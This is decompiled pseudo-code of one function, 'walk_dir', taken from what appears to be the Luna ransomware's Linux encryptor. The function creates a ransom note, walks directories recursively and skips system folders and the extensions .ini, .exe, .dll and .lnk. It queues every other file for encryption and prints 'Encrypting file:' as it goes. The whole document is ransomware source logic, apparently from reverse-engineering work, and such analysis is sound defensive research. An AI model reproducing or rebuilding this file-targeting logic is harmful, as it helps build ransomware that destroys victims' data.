long long linux_encryptor::files::walk_dir::h3bbd2a8a81e3b38e(unsigned long long a0[3])
{
    struct struct_1 **v0;  // [sp-0x138], Other Possible Types: char
    unsigned long long v1;  // [sp-0x130]
    void* v2;  // [sp-0x128]
    struct struct_1 **v3;  // [sp-0x118]
    unsigned long long v4;  // [sp-0x110]
    struct struct_0 **v5;  // [bp-0x108]
    unsigned long long *v6;  // [sp-0x100]
    unsigned long long *v7;  // [sp-0xf8], Other Possible Types: unsigned long long
    char *v8;  // [sp-0xf0]
    unsigned long long *v9;  // [sp-0xe8]
    unsigned long long *v10;  // [sp-0xe0]
    char *v11;  // [sp-0xd8]
    unsigned long long *v12;  // [sp-0xd0]
    char v13;  // [bp-0xc8]
    char v14;  // [bp-0xc0]
    struct struct_0 **v15;  // [sp-0xb8]
    struct struct_0 **v16;  // [sp-0xa8]
    struct struct_0 **v17;  // [sp-0x98]
    char *v18;  // [sp-0x80]
    struct struct_0 **v19;  // [sp-0x78]
    unsigned long long v20;  // [sp-0x70]
    char v21;  // [sp-0x60], Other Possible Types: unsigned long
    char v22;  // [bp-0x50]
    char v23;  // [bp-0x40]
    unsigned long v25;  // rdx
    struct struct_2 **v26;  // r12
    int v27;  // ymm0
    int v28;  // ymm1
    int v29;  // ymm2
    struct struct_0 **v30;  // xmm0
    struct struct_0 **v31;  // xmm1
    struct struct_0 **v32;  // xmm2
    struct struct_1 **v33;  // rbx
    struct struct_1 **v35;  // r15
    void* v36;  // rax
    struct struct_1 **v37;  // rbx
    unsigned long long *v39;  // rdx
    char *v40;  // rbp
    struct struct_1 **v41;  // r15
    void* v42;  // rax
    char *v43;  // rsi
    unsigned long long *v44;  // rbp
    struct struct_0 **v45;  // rbx
    struct struct_0 **v46;  // xmm0
    char *v47;  // r15
    char *v48;  // rbp
    struct struct_1 **v49;  // rbx
    char v51;  // r12b
    struct struct_1 **v52;  // rbx
    struct struct_1 **v54;  // rbx
    struct struct_1 **v56;  // rbx
    struct struct_1 **v58;  // rbx
    struct struct_1 **v60;  // rbx
    struct struct_1 **v62;  // rbx
    struct struct_1 **v64;  // r15
    struct struct_1 **v66;  // rbx
    char v68;  // bl
    struct struct_1 **v69;  // rbp
    unsigned long long v71;  // rsi
    unsigned long long *v72;  // rax
    unsigned long long v73;  // 4099
    unsigned long long *v74;  // rax
    unsigned long long v75;  // 4099

    linux_encryptor::files::create_note::hd3c91fc90c0b0684();
    if (std::sys::unix::fs::readdir::hc7a318d57b997c9d(a0[0], a0[2]))
    {
        v21 = v25;
        goto *((int *)(4534500 + (vvar_262{reg 32} & 3) * 4)) + 4534500;
    }
    else
    {
        v26 = &v0;
        while (true)
        {
            _$LT$std..fs..ReadDir$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::hfa8168d00a87d0de(&v21, &v14);
            if ((int)v21 == 2)
                break;
            v30 = *((int128_t *)&v21);
            v27 = v27 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | (uint256_t)v30;
            v31 = *((int128_t *)&v22);
            v28 = v28 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | (uint256_t)v31;
            v32 = *((int128_t *)&v23);
            v29 = v29 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | (uint256_t)v32;
            v17 = v32;
            v16 = v31;
            v15 = v30;
            if (v15)
            {
                v0 = &v15;
                core::result::unwrap_failed::hddd78f4658ac7d0f("called `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &v0, &g_473e90, &g_474180); /* do not return */
            }
            std::fs::DirEntry::path::h836d7a4ec6da8dd4(v26, &v15);
            v33 = v0;
            if (v1)
                __rust_dealloc(v33);
            if ((char)std::path::Path::is_dir::ha9f0bdbf3023c324(v33, v2))
            {
                if (v15)
                {
                    v0 = &v15;
                    core::result::unwrap_failed::hddd78f4658ac7d0f("called `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &v0, &g_473e90, &g_474198); /* do not return */
                }
                std::fs::DirEntry::path::h836d7a4ec6da8dd4(v26, &v15);
                v35 = v0;
                v36 = std::sys::unix::os_str::Slice::to_str::he74c7d893dc6b80f(v35, v2);
                if (!v36)
                    core::panicking::panic::h8705e81f284be8a5("called `Option::unwrap()` on a `None` valuecalled `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &g_4741b0); /* do not return */
                if (!v39)
                {
                    v40 = 1;
                }
                else
                {
                    v40 = __rust_alloc(v39, 1);
                    if (!v40)
                        alloc::alloc::handle_alloc_error::h17f9e80a43aee885(); /* do not return */
                }
                memcpy(v40, v36, v39);
                v8 = v40;
                v9 = v39;
                v10 = v39;
                _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::h3549ccdcce7dad99(&v11, &v8);
                v43 = *((long long *)&v13);
                v26 = &v0;
                if (v12 == v43)
                {
                    alloc::raw_vec::RawVec$LT$T$C$A$GT$::reserve::do_reserve_and_handle::h0efe5460ba49e6e2(&v11, v43, 1);
                    v43 = *((long long *)&v13);
                }
                *((char *)(v11 + v43)) = 92;
                v7 = v43 + 1;
                v46 = *((int128_t *)&v11);
                v27 = v27 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | (uint256_t)v46;
                v5 = v46;
                if (v9)
                    __rust_dealloc(v8);
                if (v1)
                    __rust_dealloc(v35);
                alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::h35fae7dd60ec49e2(&v8, v5, v7);
                v47 = v8;
                if (!(char)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7("openserverwindowsprogram filesrecycle.binprogramdataappdataall usersEncrypting file: ", 10, v47, v10))
                {
                    alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::h35fae7dd60ec49e2(&v0, v5, v7);
                    v49 = v0;
                    if (v1)
                        __rust_dealloc(v49);
                    if (!(char)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7("windowsprogram filesrecycle.binprogramdataappdataall usersEncrypting file: ", 7, v49, v2))
                    {
                        alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::h35fae7dd60ec49e2(&v0, v5, v7);
                        v54 = v0;
                        if (v1)
                            __rust_dealloc(v54);
                        if (!(char)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7("program filesrecycle.binprogramdataappdataall usersEncrypting file: ", 13, v54, v2))
                        {
                            alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::h35fae7dd60ec49e2(&v0, v5, v7);
                            v58 = v0;
                            if (v1)
                                __rust_dealloc(v58);
                            if (!(char)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7("recycle.binprogramdataappdataall usersEncrypting file: ", 11, v58, v2))
                            {
                                alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::h35fae7dd60ec49e2(&v0, v5, v7);
                                v62 = v0;
                                if (v1)
                                    __rust_dealloc(v62);
                                if (!(char)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7("programdataappdataall usersEncrypting file: ", 11, v62, v2))
                                {
                                    alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::h35fae7dd60ec49e2(&v0, v5, v7);
                                    v66 = v0;
                                    if (v1)
                                        __rust_dealloc(v66);
                                    if (!(char)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7("appdataall usersEncrypting file: ", 7, v66, v2))
                                    {
                                        alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::h35fae7dd60ec49e2(&v0, v5, v7);
                                        v69 = v0;
                                        if (v1)
                                            __rust_dealloc(v69);
                                        v68 = (int)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7("all usersEncrypting file: ", 9, v69, v2) & 0xffffffffffffff00 | (char)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7("all usersEncrypting file: ", 9, v69, v2) ^ 1;
                                        if (!v9)
                                            goto LABEL_40c187;
LABEL_40c17c:
                                        __rust_dealloc(v47);
LABEL_40c187:
                                        if (v68)
                                            linux_encryptor::files::walk_dir::h3bbd2a8a81e3b38e(&v5);
                                        if (!v6)
                                            goto LABEL_40c1b3;
                                        goto LABEL_40c1a6;
                                    }
                                }
                            }
                        }
                    }
                }
                v68 = 0;
                if (!v9)
                    goto LABEL_40c187;
                goto LABEL_40c17c;
            }
            if (v15)
            {
                v0 = &v15;
                core::result::unwrap_failed::hddd78f4658ac7d0f("called `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &v0, &g_473e90, &g_4741c8); /* do not return */
            }
            std::fs::DirEntry::path::h836d7a4ec6da8dd4(v26, &v15);
            v37 = v0;
            if (v1)
                __rust_dealloc(v37);
            if (!(char)std::path::Path::is_file::h26f29fcceca286a1(v37, v2))
                goto LABEL_40c1b3;
            if (v15)
            {
                v0 = &v15;
                core::result::unwrap_failed::hddd78f4658ac7d0f("called `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &v0, &g_473e90, &g_4741e0); /* do not return */
            }
            std::fs::DirEntry::path::h836d7a4ec6da8dd4(v26, &v15);
            v41 = v0;
            v42 = std::sys::unix::os_str::Slice::to_str::he74c7d893dc6b80f(v41, v2);
            if (!v42)
                core::panicking::panic::h8705e81f284be8a5("called `Option::unwrap()` on a `None` valuecalled `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &g_4741f8); /* do not return */
            v44 = v39;
            if (!v39)
            {
                v45 = 1;
            }
            else
            {
                v45 = __rust_alloc(v39, 1);
                if (!v45)
                    alloc::alloc::handle_alloc_error::h17f9e80a43aee885(); /* do not return */
            }
            memcpy(v45, v42, v39);
            v5 = v45;
            v6 = v39;
            v7 = v39;
            if (v1)
            {
                __rust_dealloc(v41);
                v45 = v5;
                v44 = v7;
            }
            alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::h35fae7dd60ec49e2(&v11, v45, v44);
            v48 = v11;
            if ((char)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7(".ini.exe.dll.lnk", 4, v48, *((long long *)&v13)))
            {
                v51 = 0;
                if (!v12)
                    goto LABEL_40c2a5;
                goto LABEL_40c29a;
            }
            alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::h35fae7dd60ec49e2(&v0, v5, v7);
            v52 = v0;
            if (v1)
                __rust_dealloc(v52);
            if ((char)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7(".exe.dll.lnk", 4, v52, v2))
            {
LABEL_40c454:
                v51 = 0;
                goto LABEL_40c457;
            }
            else
            {
                alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::h35fae7dd60ec49e2(&v0, v5, v7);
                v56 = v0;
                if (v1)
                    __rust_dealloc(v56);
                if (!(!(char)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7(".dll.lnk", 4, v56, v2)))
                    goto LABEL_40c454;
                alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::h35fae7dd60ec49e2(&v0, v5, v7);
                v60 = v0;
                if (v1)
                    __rust_dealloc(v60);
                if (!(!(char)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7(".lnk", 4, v60, v2)))
                    goto LABEL_40c454;
                alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::h35fae7dd60ec49e2(&v8, v5, v7);
                v18 = v8;
                core::str::converts::from_utf8::hbf99f44e098525d0(&v0, "Luna.ini.exe.dll.lnk", 4);
                if (v0)
                {
                    *((int128_t *)&v19) = *((int128_t *)&v1);
                    core::result::unwrap_failed::hddd78f4658ac7d0f("called `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &v19, &g_473eb0, &g_474210); /* do not return */
                }
                alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::h35fae7dd60ec49e2(&v0, v1, v2);
                v64 = v0;
                if (v1)
                    __rust_dealloc(v64);
                if (v9)
                    __rust_dealloc(v18);
                v51 = (int)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7(v64, v2, v18, v10) & 0xffffffffffffff00 | (char)core::str::pattern::Pattern::is_contained_in::h7ff10870f2c331f7(v64, v2, v18, v10) ^ 1;
LABEL_40c457:
                if (!v12)
                    goto LABEL_40c2a5;
LABEL_40c29a:
                __rust_dealloc(v48);
LABEL_40c2a5:
                v26 = &v0;
                if (v51)
                {
                    if (v15)
                    {
                        v0 = &v15;
                        core::result::unwrap_failed::hddd78f4658ac7d0f("called `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &v0, &g_473e90, &g_474248); /* do not return */
                    }
                    std::fs::DirEntry::path::h836d7a4ec6da8dd4(&v8, &v15);
                    v11 = v8;
                    v12 = v10;
                    v19 = &v11;
                    v20 = _$LT$std..path..Display$u20$as$u20$core..fmt..Display$GT$::fmt::hb45284db698e311b;
                    v0 = &g_474228;
                    v1 = 2;
                    v2 = 0;
                    v3 = &v19;
                    v4 = 1;
                    std::io::stdio::_print::h7035045a22bdb588(&v0, v71, v39);
                    if (v9)
                        __rust_dealloc(v11);
                    linux_encryptor::files::add_file::h9f8ecb31ebca83c0(&v5);
                }
                if (!v6)
                    goto LABEL_40c1b3;
LABEL_40c1a6:
                __rust_dealloc(v5);
LABEL_40c1b3:
                if (v15)
                {
                    core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h3fc65152347e7263(&v15);
                }
                else
                {
                    v72 = (&v15)[1];
                    v73 = *(v72);
                    *(v72) = v73 - 1;
                    if (CasCmpNE(*(v72), v73))
                        goto LABEL_0x40c1ca;
                    if (v73 == 1)
                        alloc::sync::Arc$LT$T$GT$::drop_slow::hbfdcf0b3892a7d2a(&v15);
                    *((char *)v17) = 0;
                    if ((&v17)[1])
                        __rust_dealloc(v17);
                }
            }
        }
        v74 = v39;
        v75 = *(v39);
        *(v39) = v75 - 1;
        if (CasCmpNE(*(v39), v75))
            goto LABEL_0x40c584;
        if (v75 == 1)
        {
            v74 = alloc::sync::Arc$LT$T$GT$::drop_slow::hbfdcf0b3892a7d2a(&v14);
            return v74;
        }
        return v74;
    }
}
